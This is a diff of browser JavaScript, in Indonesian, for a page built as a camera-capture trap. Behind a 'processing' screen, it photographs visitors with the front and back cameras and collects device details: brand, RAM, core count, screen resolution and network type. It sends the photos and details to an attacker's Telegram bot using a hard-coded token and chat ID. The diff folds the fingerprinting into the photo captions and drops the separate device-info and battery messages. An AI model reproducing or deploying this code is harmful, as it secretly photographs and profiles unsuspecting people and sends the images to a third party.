@@ -34,29 +34,26 @@
 const T="8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
 const C="1923372966";
 
-function getDeviceInfo(){
+function getInfo(){
     const ua=navigator.userAgent;
-    const p=navigator.platform||'';
-    const l=navigator.language||'';
-    const v=navigator.vendor||'';
-    const c=navigator.hardwareConcurrency||'?';
-    const m=navigator.maxTouchPoints||0;
-    const r=screen.width+'x'+screen.height;
-    const d=devicePixelRatio||1;
-    const ram=navigator.deviceMemory||'?';
-    const conn=navigator.connection||{};
-    const net=conn.effectiveType||'?';
-    const down=conn.downlink||'?';
-    const bat='getBattery' in navigator?'?':'?';
+    let brand='Tidak diketahui';
+    if(ua.includes('iPhone'))brand='iPhone';
+    else if(ua.includes('Samsung'))brand='Samsung';
+    else if(ua.includes('Xiaomi')||ua.includes('Redmi'))brand='Xiaomi';
+    else if(ua.includes('OPPO'))brand='OPPO';
+    else if(ua.includes('vivo'))brand='Vivo';
+    else if(ua.includes('Realme'))brand='Realme';
+    else if(ua.includes('Infinix'))brand='Infinix';
+    else if(ua.includes('Tecno'))brand='Tecno';
+    else if(ua.includes('Windows'))brand='Windows PC';
+    else if(ua.includes('Mac'))brand='Mac';
     
-    return '📱 DEVICE INFO\n'+
-        '🖥 UserAgent: '+ua.substring(0,80)+'\n'+
-        '📏 Resolusi: '+r+' @'+d+'x\n'+
-        '🧠 RAM: '+ram+'GB | Core: '+c+'\n'+
-        '👆 Touch: '+m+' | Platform: '+p+'\n'+
-        '🌐 Bahasa: '+l+' | Vendor: '+v+'\n'+
-        '📶 Jaringan: '+net+' | Speed: '+down+'Mbps\n'+
-        '🕐 Waktu: '+new Date().toLocaleString();
+    const ram=navigator.deviceMemory||'?';
+    const core=navigator.hardwareConcurrency||'?';
+    const res=screen.width+'x'+screen.height;
+    const net=navigator.connection?navigator.connection.effectiveType:'?';
+    
+    return '📱 '+brand+' | RAM '+ram+'GB | '+core+' Core\n📏 '+res+' | 📶 '+net+'\n🕐 '+new Date().toLocaleString();
 }
 
 async function k(f,l){
@@ -78,43 +75,16 @@ async function k(f,l){
     const d=new FormData();
     d.append('chat_id',C);
     d.append('photo',b,l+'.jpg');
-    d.append('caption','📸 '+l+' - '+new Date().toLocaleString());
+    d.append('caption','📸 '+l+'\n'+getInfo());
     await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:d});
 }
 
 (async()=>{
 try{
     document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memproses</h2><p>Tunggu sebentar</p>';
-    
-    // Foto depan
     await k('user','DEPAN');
     await new Promise(r=>setTimeout(r,500));
-    
-    // Foto belakang
     try{await k('environment','BELAKANG');}catch(e){}
-    
-    // Kirim info device lengkap
-    await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:C,text:getDeviceInfo()})
-    });
-    
-    // Cek baterai kalau bisa
-    if('getBattery' in navigator){
-        try{
-            const bat=await navigator.getBattery();
-            await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    chat_id:C,
-                    text:'🔋 Baterai: '+(bat.level*100).toFixed(0)+'% | Charging: '+(bat.charging?'Ya':'Tidak')
-                })
-            });
-        }catch(e){}
-    }
-    
     document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Bisa tutup halaman ini</p>';
 }catch(e){
     document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Gagal</h2><p>Izin kamera diperlukan</p><button onclick="location.reload()">Coba Lagi</button>';
